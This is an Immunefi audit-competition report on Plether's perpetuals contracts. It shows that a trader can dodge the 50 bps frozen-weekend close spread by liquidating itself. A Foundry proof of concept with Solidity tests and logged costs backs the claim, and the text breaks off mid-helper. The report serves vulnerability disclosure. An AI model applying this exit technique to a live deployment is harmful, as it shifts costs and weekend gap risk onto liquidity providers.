# \#99697 [SC-Medium] Frozen-weekend exits can avoid the 50 bps LP frozen-close spread by electing liquidation: a position held at the FAD margin leaves at the stale mark for 7.5–12.5 bps instead of 54 bps

**Submitted on Nov 14th 2026 at 20:36:49 UTC by @EntropyResearch for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99697
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

**Severity:** Low — *Contract fails to deliver promised returns, but doesn't lose value*. The protocol promises LPs a fixed spread as compensation for voluntary exits at the stale weekend mark; a trader holding its position at the FAD margin can take the same exit without paying it.
**Target:** `packages/perps/src` — `libraries/CfdEnginePlanLib.sol` (liquidation planning), `CfdEngine.sol` (`addMargin`, `_applyLiquidation`), `router/OrderLiquidationBatchLogic.sol` (`executeLiquidation`), `PletherOracle.sol` (`_frozenBasket`), `libraries/CloseAccountingLib.sol` (frozen spread)
**Commit:** a82d4fefb02768e5b3bddcc97dee371eee24fea8

## Brief / Intro

While the oracle is frozen (weekends and holiday override days), every exit uses the last Friday mark. Voluntary closes pay a fixed 50 bps **frozen-close spread** to LPs plus the 4 bps execution fee; the whitepaper lists the spread's purpose as "Compensate LPs for voluntary stale-mark exit" (`WHITEPAPER.md` §5 charge table). Liquidations do not pay it, which the documentation presents as a liveness trade-off.

During the freeze the account owner controls when its position becomes liquidatable: the mark cannot move, liquidation uses the 3% FAD margin, `addMargin` works at any time and only the owner can call it, and equity otherwise only falls through carry. A trader that keeps equity a small buffer above 3% is safe from third-party liquidation for as long as it tops up. When it wants to leave at the stale mark, it stops topping up and, once carry has crossed the margin, liquidates itself and collects the keeper half of the charge. The exit costs about **7.5 bps** (12.5 bps if another keeper wins) instead of **54 bps**.

In the PoC two identical $100k positions leave at the same frozen mark: the voluntary close costs the trader **490.34 USDG** (LPs receive 450.34, treasury 40.00); the self-liquidation costs **75.35 USDG** (LPs receive 75.35, treasury 0).

## Vulnerability Details

1. **The spread is charged only on voluntary closes.** `CloseAccountingLib` adds the frozen spread (`frozenCloseSpreadBps`, 50 at release) to closes executed while `oracleFrozen`. Liquidation planning never assesses it and frozen liquidations price at the Engine mark with a deterministic shift: `PletherOracle._frozenBasket` sets `confidence = price × basketMaxConfidenceRatioBps / 10_000` (L742), and `_liquidationConfidenceShift` applies `adverseConfidenceMultiplierBps` (L960-972), i.e. 2.5 bps at release.

2. **While frozen, liquidation eligibility is under the owner's control from above.**
   - Health uses the FAD margin while frozen: `CfdEnginePlanLib.sol:1450` `maintMarginBps = snap.isFadWindow ? snap.riskParams.fadMarginBps : snap.riskParams.maintMarginBps` (3% at release).
   - The mark is fixed during the freeze, so equity changes only through carry (down) and `addMargin` (up). `CfdEngine.addMargin` (L501-529) has no oracle or calendar gate and requires `msg.sender == account`, so no one else can keep the account healthy; `MarginClearinghouse.depositFor` credits free settlement, which is not price-risk equity (PoC test 3).
   - There is no remove-margin entrypoint, so the owner cannot drop below the threshold at will; it keeps a small buffer and lets carry erode it when it decides to leave.

3. **The owner can be its own liquidator.** `OrderLiquidationBatchLogic.executeLiquidation` passes `msg.sender` as the keeper (L726-729) and the Engine explicitly supports `keeper == account` (`CfdEngine.sol:1331, 1336`). With `keeperShareBps = 5_000`, half of the 10 bps liquidation charge returns to the trader. If another keeper liquidates first, the trader pays 12.5 bps and has still exited at the stale mark.

Net effect per unit of notional at release parameters: voluntary frozen close 50 bps (LPs) + 4 bps (treasury) ± VPI; self-liquidation 2.5 bps shift + 10 bps charge − 5 bps own keeper share = 7.5 bps, all to LPs; third-party liquidation 12.5 bps to the trader, 7.5 bps to LPs.

### Conditions (stated plainly)

- The position must sit at roughly 33x (equity near the 3% FAD margin) when the market closes. During the live FAD half hour it has to stay above 3% at live prices, so adverse moves require top-ups, while a favourable last move leaves a surplus that only carry can erode, which can take far longer than a weekend at low utilisation. The route is therefore available on weekends where the final live mark leaves the account close to the threshold, not on every weekend.
- The owner pays carry plus dust top-ups to keep the option open (PoC: 1 USDG keeps a $100k position protected for at least another hour).
- Holiday override days use the same code path (`MarketCalendarLib.marketStatus` returns frozen for the whole UTC day), and because overrides cover whole UTC days while FX reopens at 17:00 New York, live Pyth prices are published on-chain during part of an override while the protocol still replays the stale mark. This variant is not covered by the PoC.

### What is and is not documented

The exemption itself is documented and deliberate:

- `SECURITY.md:843-845`: "liquidation pricing and settlement retain adverse-confidence pricing and do not assess the spread. This is a deliberate trade-off: preserve close and liquidation liveness during real closures without weakening live-market MEV protections."
- `SECURITY.md` Known Limitations L1333 and L1442 (the fixed spread applies to oracle-frozen voluntary closes only); `ACCOUNTING_SPEC.md:1188` ("liquidation does not assess `frozenCloseSpreadBps`, including while `oracleFrozen`"); `WHITEPAPER.md:1304` ("Liquidations never assess this spread").

What the documentation does not consider is that the owner decides when the position becomes liquidatable during the freeze and can be its own liquidator, which turns the liveness exemption into a cheaper substitute for the voluntary stale-mark exit the spread is meant to price. The trade-off is justified by liveness of involuntary liquidations; here the liquidation is elective and the exit is the same one a voluntary close would have made. No previous report or listed known issue describes this use (searched the five prior reports and the known-issues list for self-liquidation, own-keeper liquidation and frozen-spread avoidance).

## Impact Details

- **LP compensation is not delivered.** Per $1M of notional at release parameters, the trader saves about $4,650 compared with a voluntary frozen close; LPs receive about $4,250 less and the treasury $400 less (third-party keeper case: the trader saves about $4,150; LP shortfall unchanged).
- **Weekend gap risk shifts to LPs.** With the spread, leaving at the stale mark only pays when the expected reopen gap exceeds about 54 bps; with self-liquidation it pays from about 7.5 bps. For a rational, informed holder per $1M of notional (carry and VPI ignored):

| Adverse reopen gap | Documented design | With elective liquidation | Change for LPs |
|---|---|---|---|
| 20 bps | holds: LPs +$2,000 | exits: LPs +$750 | −$1,250 |
| 60 bps | voluntary close: LPs +$5,000, treasury +$400 | exits: LPs +$750 | −$4,250 (treasury −$400) |
| 150 bps | voluntary close: LPs +$5,000, treasury +$400 | exits: LPs +$750 | −$4,250 (treasury −$400) |

  PoC test 2 measures the 30 bps case for a $100k position: the trader who held through the gap lost 292.78 USDG to the pool, the one who left at Friday's mark through self-liquidation lost 75.69 USDG.
- Nothing is stolen or frozen and the exit still pays LPs 7.5 bps, hence Low.

## Risk Breakdown

- **Privileges: none.** Only permissionless entrypoints are used (`addMargin`, `executeLiquidation`), plus ordinary trading.
- **Complexity: medium.** The trader must hold equity close to the 3% FAD margin when the market closes and keep a small buffer with dust top-ups (PoC: 1 USDG per hour per $100k). The required amounts are deterministic functions of on-chain state. The route is available on weekends and override days where the final live mark leaves the account close to the threshold, not on every weekend.
- **Cost to the trader:** carry plus dust top-ups; capital of about 3% of notional per position.
- **Impact:** per $1M of notional exited, LPs receive about $4,250 less and the treasury $400 less than through the documented voluntary frozen close; LPs also absorb reopen gaps between about 7.5 and 54 bps that the spread would otherwise have priced. Funds at risk scale with the notional held into each freeze (bounded by the skew cap of 0.4 × pool depth per side and the solvency buffer).

## Recommendation

Assess the frozen-close spread on liquidations executed while `oracleFrozen`, capped by the residual left after the price loss and the liquidation charge. The cap keeps liquidation live in exactly the cases the current trade-off protects (an account with nothing left pays nothing extra), while an account that is liquidated with collateral to spare can no longer leave at the stale mark more cheaply than through a voluntary close. Credit the assessed spread to LPs as the voluntary path does.

## References

- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1450` — FAD margin for liquidation health while frozen.
- `packages/perps/src/CfdEngine.sol:501-529` (`addMargin`), `1010-1042` (`liquidatePosition`), `1331, 1336` (`keeper == account` handling).
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:706-730` — `executeLiquidation`, keeper is `msg.sender`.
- `packages/perps/src/PletherOracle.sol:729-743` (`_frozenBasket`), `960-972` (`_liquidationConfidenceShift`).
- `packages/perps/src/libraries/CloseAccountingLib.sol` — frozen spread on voluntary closes.
- `packages/perps/SECURITY.md:843-845, 1333, 1442`; `ACCOUNTING_SPEC.md:1188`; `WHITEPAPER.md:1304` and §5 charge table.

## Proof of Concept

## Proof of Concept

### How to run

No RPC, fork or environment variables are needed; the PoC runs in the repository's own Foundry test suite at the commit in scope, as this program's PoC rules allow.

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/perps/poc
# copy the files below into packages/perps/test/perps/poc/
FOUNDRY_SPARSE_MODE=true forge test --root packages/perps --match-path 'test/perps/poc/FrozenSpreadBypassPoC.t.sol' -vv
```

Tested with Foundry `forge 1.9.0` (solc 0.8.35 is selected by `foundry.toml`). The package compiles with via-IR, so the first run takes roughly 10 minutes. `FOUNDRY_SPARSE_MODE=true` only limits compilation to the matched test files; the results are the same without it.

**Conformity with the program's PoC rules.** The tests use the repository's own `BasePerpTest` fixture, which deploys the real `CfdEngine`, `MarginClearinghouse`, `HousePool`, `TrancheVault`s, `PletherOracle` and `OrderRouter` stack. Only out-of-scope components are mocked: Pyth (`MockPyth`) and USDG (`MockSettlementToken`). No in-scope contract is modified. The fixture deploys the router as `LegacyOrderRouterHarness`, a repository test utility that inherits the production `OrderRouter` without overriding any function; every call in these tests uses production selectors (`commitOrder(OrderRequest)`, `executeOrder`, `executeLiquidation`, `updateMarkPrice`, and the `PositionProtectionBook`, `CfdEngine` and `MarginClearinghouse` entrypoints). Risk parameters are the release values from `packages/perps/DEPLOYMENT.md`. Each test prints every step and the values that prove the impact (`-vv`).

### What the tests show

Release risk parameters from `DEPLOYMENT.md` are used, including `adverseConfidenceMultiplierBps = 2500` applied through the timelocked router-config path. All actions go through production entrypoints (Router commit and keeper execute, `executeLiquidation`, `addMargin`, `depositFor`); `MockPyth` supplies signed prices only. No in-scope contract is modified.

- `test_poc_selfLiquidationBypassesFrozenCloseSpread` — Alice, Bob and Dave hold identical $100k LONGs with equity just above 3% at the freeze. One hour into the freeze third-party liquidations of all three revert with `CfdEngine__PositionIsSolvent`. Dave adds 1 USDG and is still protected an hour later. Alice exits through a voluntary frozen close. Bob adds nothing, his own liquidation attempt reverts, and one hour later it succeeds. Trader, LP-pool and treasury deltas are measured for both exits.
- `test_poc_staleMarkExitShiftsMondayGapOntoLPs` — Bob leaves on Saturday through self-liquidation; Carol holds the same position through a 30 bps adverse reopen.
- `test_poc_thirdPartyLiquidationIsStillACheapStaleMarkExit` — a helper's `depositFor` does not restore Bob's position equity; a third-party keeper liquidates him and the exit still costs about 12.5 bps, with LPs receiving about 7.5 bps.

### Test output (`-vv`)

```
[PASS] test_poc_selfLiquidationBypassesFrozenCloseSpread() (gas: 87082461)
Logs:
  FAD-start top-up to reach 3% (Bob, USDG): 1319.659505
  Hours Bob waited, adding nothing, before his liquidation succeeded: 1
  (A) Alice voluntary frozen close: trader cost (USDG): 490.340696
  (A) Alice voluntary frozen close: LP pool inflow (USDG): 450.340696
  (A) Alice voluntary frozen close: treasury inflow (USDG): 40.000000
  (B) Bob self-liquidation: trader cost (USDG): 75.347888
  (B) Bob self-liquidation: LP pool inflow (USDG): 75.347888
  (B) Bob self-liquidation: treasury inflow (USDG): 0.000000
[PASS] test_poc_staleMarkExitShiftsMondayGapOntoLPs() (gas: 35481060)
Logs:
  Bob loss, exited at stale mark via self-liquidation (USDG): 75.690026
  Carol loss, held through the 30 bps gap (USDG): 292.783263
  LP pool inflow from Bob (USDG): 75.690026
  LP pool inflow from Carol (USDG): 292.783263
[PASS] test_poc_thirdPartyLiquidationIsStillACheapStaleMarkExit() (gas: 30330436)
Logs:
  Third-party liquidation: trader cost (USDG): 125.133795
  Third-party liquidation: LP pool inflow (USDG): 75.133795
  Third-party liquidation: treasury inflow (USDG): 0.000000
Suite result: ok. 3 passed; 0 failed; 0 skipped;
```

### `packages/perps/test/perps/poc/PocBase.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

/// @notice Shared PoC base for the Immunefi Plether audit competition.
/// @dev Built on the repository's own `BasePerpTest` fixture (real CfdEngine, MarginClearinghouse, HousePool,
///      TrancheVaults, PletherOracle, OrderRouter stack). Only out-of-scope components are mocked: Pyth (`MockPyth`)
///      and USDG (`MockSettlementToken`). The fixture deploys the router as `LegacyOrderRouterHarness`, a test utility
///      that inherits the production `OrderRouter` unchanged; every call in these PoCs uses production selectors
///      (`commitOrder(OrderRequest)`, `executeOrder`, `executeLiquidation`, `updateMarkPrice`).
///      Risk parameters are the release values from packages/perps/DEPLOYMENT.md.
abstract contract PocBase is BasePerpTest {

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");
    address internal keeper = makeAddr("keeper");

    uint256 private _pocClientOrderNonce;

    /// @dev Release parameters (DEPLOYMENT.md "Initial release parameters").
    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// @dev Commits through the production `OrderRouter.commitOrder(OrderRequest)` with a market target price.
    function _commit(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 orderId) {
        // Market order: closes of LONG and opens of SHORT accept any price at or below the target, so use the maximum;
        // the other two cases accept any price at or above the target, so use 1 (OrderValidationLib.checkSlippage).
        uint256 target = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        orderId = _commitWithTarget(trader, side, size, margin, target, isClose);
    }

    /// @dev Commits through the production `OrderRouter.commitOrder(OrderRequest)` with an explicit target price.
    function _commitWithTarget(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request = _orderRequest(side, size, margin, targetPrice, isClose);
        vm.prank(trader);
        orderId = router.commitOrder(request);
    }

    /// @dev A fully bounded V3 request with permissive financial limits, as an integrator would build it.
    function _orderRequest(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("plether-poc", ++_pocClientOrderNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    /// @dev A keeper executes `orderId` through the production Router with the first post-commit signed Pyth tick.
    function _execute(
        uint64 orderId,
        uint256 price
    ) internal {
        bytes[] memory updateData = _mockPythUpdateData(price);
        vm.prank(keeper);
        router.executeOrder(orderId, updateData);
    }

    function _positionSize(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

}

/// @notice Sanity check that the base drives a full open/close through the production Router.
contract PocSanityTest is PocBase {

    function test_poc_sanity_open_close_via_router() public {
        _fundTrader(attacker, 10_000e6);

        uint64 openId = _commit(attacker, CfdTypes.Side.LONG, 100_000e18, 1_000e6, false);
        _execute(openId, 1e8);
        assertEq(_positionSize(attacker), 100_000e18, "open should fill");

        uint64 closeId = _commit(attacker, CfdTypes.Side.LONG, 100_000e18, 0, true);
        _execute(closeId, 1e8);
        assertEq(_positionSize(attacker), 0, "close should fill");
    }

}
```

### `packages/perps/test/perps/poc/FrozenSpreadBypassPoC.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PocBase} from "./PocBase.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice PoC: a trader exits during the oracle-frozen weekend at the stale Friday mark by liquidating itself,
///         paying ~7.5 bps instead of the 54 bps (50 bps frozen-close spread + 4 bps fee) a voluntary frozen close pays.
/// @dev Mechanism: the frozen-close spread is the protocol's protection against informed exits at the stale mark, but
///      liquidation "never assesses this spread". Liquidation uses the FAD margin (3%) while frozen, the mark is fixed,
///      so equity only falls by carry. A trader keeps its pledge just above 3% (addMargin has no frozen gate) and,
///      when it wants out, simply stops topping up: carry pushes it below 3% and it calls executeLiquidation on itself
///      (no msg.sender restriction), collecting the keeper half of the 10 bps charge.
contract FrozenSpreadBypassPoC is PocBase {

    /// Fri 2024-03-08 16:30 New York (EST) = FAD start; the oracle freezes 30 minutes later at 17:00.
    uint256 internal constant FRIDAY_FAD_START = 1_709_933_400;
    uint256 internal constant FREEZE = FRIDAY_FAD_START + 30 minutes;

    uint256 internal constant SIZE = 100_000e18; // $100k notional at 1.00
    uint256 internal constant MARK = 1e8;

    address internal alice = makeAddr("alice-voluntary-close");
    address internal bob = makeAddr("bob-self-liquidation");
    address internal carol = makeAddr("carol-holds-through-the-gap");

    /// @dev Release oracle parameter from DEPLOYMENT.md: adverseConfidenceMultiplierBps = 2_500 (the fixture default
    ///      is 2_000). Applied through the production timelocked router-config path.
    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500, "release liquidation shift multiplier");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "release basket confidence ratio");
    }

    /// Test 1: option control and a like-for-like comparison between two identical positions.
    /// Alice and Bob hold the same $100k LONG with equity just above the 3% FAD margin when the oracle freezes.
    /// One hour into the freeze third-party liquidations of both revert. Alice exits through the documented voluntary
    /// frozen close; Bob adds nothing and retries liquidating himself every hour until carry has crossed the margin.
    /// A third identical trader, Dave, shows that 1 USDG of margin keeps third parties out for another hour.
    function test_poc_selfLiquidationBypassesFrozenCloseSpread() public {
        address dave = makeAddr("dave-keeps-the-option");
        _fundTrader(alice, 20_000e6);
        _fundTrader(bob, 20_000e6);
        _fundTrader(dave, 20_000e6);

        vm.warp(FRIDAY_FAD_START - 1 days);
        _liveRefresh(MARK);
        _routerOpen(alice, 2_000e6);
        _routerOpen(bob, 2_000e6);
        _routerOpen(dave, 2_000e6);

        // Friday 16:30:01 NY: FAD (3% margin) starts. Each adds the smallest buffer that lasts one hour into the freeze.
        vm.warp(FRIDAY_FAD_START + 1);
        _liveRefresh(MARK);
        uint256 topUpAlice = _minimalTopUp(alice, FREEZE + 1 hours + 5 minutes);
        uint256 topUpBob = _minimalTopUp(bob, FREEZE + 1 hours + 5 minutes);
        uint256 topUpDave = _minimalTopUp(dave, FREEZE + 1 hours + 5 minutes);
        vm.prank(alice);
        engine.addMargin(alice, topUpAlice);
        vm.prank(bob);
        engine.addMargin(bob, topUpBob);
        vm.prank(dave);
        engine.addMargin(dave, topUpDave);
        vm.warp(FREEZE - 1);
        _liveRefresh(MARK);

        // One hour into the freeze: nobody can liquidate any of them.
        vm.warp(FREEZE + 1 hours);
        assertTrue(engine.isOracleFrozen(), "frozen weekend");
        _expectSolvent(alice);
        _expectSolvent(bob);
        _expectSolvent(dave);

        // Dave keeps the option for another hour with 1 USDG.
        vm.prank(dave);
        engine.addMargin(dave, 1e6);

        // (A) Alice: documented voluntary frozen close (50 bps spread to LPs, 4 bps fee to treasury).
        (uint256 traderCostA, uint256 lpInflowA, uint256 treasuryInflowA) = _measureVoluntaryClose(alice);

        // (B) Bob: adds nothing and tries to liquidate himself every hour. A failed attempt changes no state.
        uint256 hoursWaited;
        uint256 traderCostB;
        uint256 lpInflowB;
        uint256 treasuryInflowB;
        while (true) {
            address treasury = engine.protocolTreasury();
            uint256 traderBefore = clearinghouse.balanceAssets(bob);
            uint256 poolBefore = pool.totalAssets();
            uint256 treasuryBefore = clearinghouse.balanceAssets(treasury);
            vm.prank(bob);
            try router.executeLiquidation(bob, new bytes[](0)) {
                traderCostB = traderBefore - clearinghouse.balanceAssets(bob);
                lpInflowB = pool.totalAssets() - poolBefore;
                treasuryInflowB = clearinghouse.balanceAssets(treasury) - treasuryBefore;
                break;
            } catch {
                vm.warp(block.timestamp + 1 hours);
                ++hoursWaited;
                require(hoursWaited <= 24, "did not become liquidatable within a day");
                if (hoursWaited == 1) {
                    // Dave, who added 1 USDG, is still protected from third parties.
                    _expectSolvent(dave);
                }
            }
        }
        assertEq(_positionSize(bob), 0, "Bob exited at the frozen mark");

        emit log_named_decimal_uint("FAD-start top-up to reach 3% (Bob, USDG)", topUpBob, 6);
        emit log_named_uint("Hours Bob waited, adding nothing, before his liquidation succeeded", hoursWaited);
        emit log_named_decimal_uint("(A) Alice voluntary frozen close: trader cost (USDG)", traderCostA, 6);
        emit log_named_decimal_uint("(A) Alice voluntary frozen close: LP pool inflow (USDG)", lpInflowA, 6);
        emit log_named_decimal_uint("(A) Alice voluntary frozen close: treasury inflow (USDG)", treasuryInflowA, 6);
        emit log_named_decimal_uint("(B) Bob self-liquidation: trader cost (USDG)", traderCostB, 6);
        emit log_named_decimal_uint("(B) Bob self-liquidation: LP pool inflow (USDG)", lpInflowB, 6);
        emit log_named_decimal_uint("(B) Bob self-liquidation: treasury inflow (USDG)", treasuryInflowB, 6);

        assertGt(hoursWaited, 0, "the account is not liquidatable while the owner keeps the buffer");
        assertLe(hoursWaited, 6, "the exit becomes available within hours");
        assertGt(traderCostA, traderCostB + 350e6, "same position, same mark: the liquidation route is far cheaper");
        assertGt(lpInflowA, lpInflowB * 3, "LPs receive a fraction of the frozen-close compensation");
        assertGt(treasuryInflowA, 0, "voluntary close pays the execution fee to treasury");
        assertEq(treasuryInflowB, 0, "self-liquidation pays the treasury nothing");
    }

    function _expectSolvent(
        address account
    ) internal {
        vm.prank(keeper);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__PositionIsSolvent.selector);
        router.executeLiquidation(account, new bytes[](0));
    }

    /// Scenario 2: why it matters. Weekend news implies the basket reopens 30 bps against LONG USD holders.
    /// Under the documented design a stale-mark exit costs 54 bps, more than the gap, so a rational trader holds and
    /// LPs keep the gap. With the bypass Bob leaves at the Friday mark for ~7.5 bps and LPs absorb the difference.
    function test_poc_staleMarkExitShiftsMondayGapOntoLPs() public {
        _fundTrader(bob, 20_000e6);
        _fundTrader(carol, 20_000e6);

        vm.warp(FRIDAY_FAD_START - 1 days);
        _liveRefresh(MARK);
        _routerOpen(bob, 2_000e6);
        _routerOpen(carol, 2_000e6);

        vm.warp(FRIDAY_FAD_START + 1);
        _liveRefresh(MARK);
        vm.prank(carol);
        engine.addMargin(carol, 3_000e6);
        uint256 topUp = _minimalTopUp(bob, FREEZE + 60);
        vm.prank(bob);
        engine.addMargin(bob, topUp);

        vm.warp(FREEZE - 1);
        _liveRefresh(MARK);

        // Saturday: Bob learns the basket will reopen higher and leaves at the Friday mark through self-liquidation.
        vm.warp(FREEZE + 6 hours);
        uint256 bobBefore = clearinghouse.balanceAssets(bob);
        uint256 poolBeforeBob = pool.totalAssets();
        vm.prank(bob);
        router.executeLiquidation(bob, new bytes[](0));
        assertEq(_positionSize(bob), 0, "Bob exited at the stale Friday mark");
        uint256 bobLoss = bobBefore - clearinghouse.balanceAssets(bob);
        uint256 lpFromBob = pool.totalAssets() - poolBeforeBob;

        // Sunday 22:01 UTC (18:01 New York; US daylight saving began that morning): the market has reopened 30 bps
        // higher (adverse for LONG USD). Carol held the same position.
        vm.warp(FREEZE + 48 hours + 60);
        assertFalse(engine.isOracleFrozen(), "market reopened");
        uint256 reopen = MARK + MARK * 30 / 10_000;
        _liveRefresh(reopen);
        uint256 carolBefore = clearinghouse.balanceAssets(carol);
        uint256 poolBeforeCarol = pool.totalAssets();
        uint64 closeId = _commit(carol, CfdTypes.Side.LONG, SIZE, 0, true);
        _execute(closeId, reopen);
        assertEq(_positionSize(carol), 0, "Carol closed at the reopened price");
        uint256 carolLoss = carolBefore - clearinghouse.balanceAssets(carol);
        uint256 lpFromCarol = pool.totalAssets() - poolBeforeCarol;

        emit log_named_decimal_uint("Bob loss, exited at stale mark via self-liquidation (USDG)", bobLoss, 6);
        emit log_named_decimal_uint("Carol loss, held through the 30 bps gap (USDG)", carolLoss, 6);
        emit log_named_decimal_uint("LP pool inflow from Bob (USDG)", lpFromBob, 6);
        emit log_named_decimal_uint("LP pool inflow from Carol (USDG)", lpFromCarol, 6);

        // Bob avoided most of a gap that the 54 bps frozen-close charge would have made uneconomic to dodge.
        assertGt(carolLoss, bobLoss + 200e6, "the stale-mark exit saved Bob more than 20 bps of notional");
        assertGt(lpFromCarol, lpFromBob + 200e6, "LPs receive that much less from the informed exiter");
    }

    /// Test 3: the base case when another keeper wins the race, and nobody can keep Bob healthy for him.
    /// `depositFor` credits free settlement, which is not price-risk equity, so a helper cannot force the 54 bps route.
    function test_poc_thirdPartyLiquidationIsStillACheapStaleMarkExit() public {
        _fundTrader(bob, 20_000e6);

        vm.warp(FRIDAY_FAD_START - 1 days);
        _liveRefresh(MARK);
        _routerOpen(bob, 2_000e6);

        vm.warp(FRIDAY_FAD_START + 1);
        _liveRefresh(MARK);
        uint256 topUp = _minimalTopUp(bob, FREEZE + 1 hours);
        vm.prank(bob);
        engine.addMargin(bob, topUp);
        vm.warp(FREEZE - 1);
        _liveRefresh(MARK);

        vm.warp(FREEZE + 2 hours);
        assertTrue(_liquidatable(bob), "Bob stopped topping up");

        address helper = makeAddr("would-be-helper");
        settlementToken.mint(helper, 5_000e6);
        vm.startPrank(helper);
        settlementToken.approve(address(clearinghouse), 5_000e6);
        clearinghouse.depositFor(bob, 5_000e6);
        vm.stopPrank();
        assertTrue(_liquidatable(bob), "depositFor does not restore position equity");

        (uint256 traderCost, uint256 lpInflow, uint256 treasuryInflow) = _measureLiquidation(bob, keeper);
        emit log_named_decimal_uint("Third-party liquidation: trader cost (USDG)", traderCost, 6);
        emit log_named_decimal_uint("Third-party liquidation: LP pool inflow (USDG)", lpInflow, 6);
        emit log_named_decimal_uint("Third-party liquidation: treasury inflow (USDG)", treasuryInflow, 6);

        assertLt(traderCost, 200e6, "still about 12.5 bps of notional for the trader");
        assertLt(lpInflow, 100e6, "LPs still receive about 7.5 bps instead of 50 bps");
    }

    // ------------------------------------------------------------------ helpers

    function _measureVoluntaryClose(
        address trader
    ) internal returns (uint256 traderCost, uint256 lpInflow, uint256 treasuryInflow) {
        address treasury = engine.protocolTreasury();
        uint256 traderBefore = clearinghouse.balanceAssets(trader);
        uint256 poolBefore = pool.totalAssets();
        uint256 treasuryBefore = clearinghouse.balanceAssets(treasury);
        uint64 closeId = _commit(trader, CfdTypes.Side.LONG, SIZE, 0, true);
        vm.prank(keeper);
        router.executeOrder(closeId, new bytes[](0));
        assertEq(_positionSize(trader), 0, "voluntary frozen close executed");
        traderCost = traderBefore - clearinghouse.balanceAssets(trader);
        lpInflow = pool.totalAssets() - poolBefore;
        treasuryInflow = clearinghouse.balanceAssets(treasury) - treasuryBefore;
    }

    function _measureLiquidation(
        address trader,
        address liquidator
    ) internal returns (uint256 traderCost, uint256 lpInflow, uint256 treasuryInflow) {
        address treasury = engine.protocolTreasury();
        uint256 traderBefore = clearinghouse.balanceAssets(trader);
        uint256 poolBefore = pool.totalAssets();
        uint256 treasuryBefore = clearinghouse.balanceAssets(treasury);
        vm.prank(liquidator);
        router.executeLiquidation(trader, new bytes[](0));
        assertEq(_positionSize(trader), 0, "liquidated at the frozen mark");
        traderCost = traderBefore - clearinghouse.balanceAssets(trader);
        lpInflow = pool.totalAssets() - poolBefore;
        treasuryInflow = clearinghouse.balanceAssets(treasury) - treasuryBefore;
    }


    function _routerOpen(
        address trader,
        uint256 margin
    ) internal {
        uint64 orderId = _commit(trader, CfdTypes.Side.LONG, SIZE, margin, false);
        _execute(orderId, MARK);
        assertEq(_positionSize(trader), SIZE, "open filled through the real Router");
    }

    /// @dev Account-adverse frozen liquidation price for a LONG (it profits when the basket falls), computed exactly as
    ///      PletherOracle._frozenBasket does: confidence = mark * basketMaxConfidenceRatioBps, shifted by
    ///      adverseConfidenceMultiplierBps (2.0 bps with this fixture's oracle defaults, 2.5 bps at release).
    function _liquidatable(
        address account
    ) internal view returns (bool) {
        uint256 mark = engine.lastMarkPrice();
        uint256 confidence = mark * pletherOracle.basketMaxConfidenceRatioBps() / 10_000;
        uint256 shift = confidence * pletherOracle.adverseConfidenceMultiplierBps() / 10_000;
        return engineLens.isLiquidatableAt(account, mark + shift, pool.totalAssets());
    }

    /// @dev Smallest addMargin that keeps `account` non-liquidatable at `checkTime` (binary search over snapshots).
    function _minimalTopUp(
        address account,
        uint256 checkTime
    ) internal returns (uint256 best) {
        uint256 lo = 1;
        uint256 hi = 10_000e6;
        best = hi;
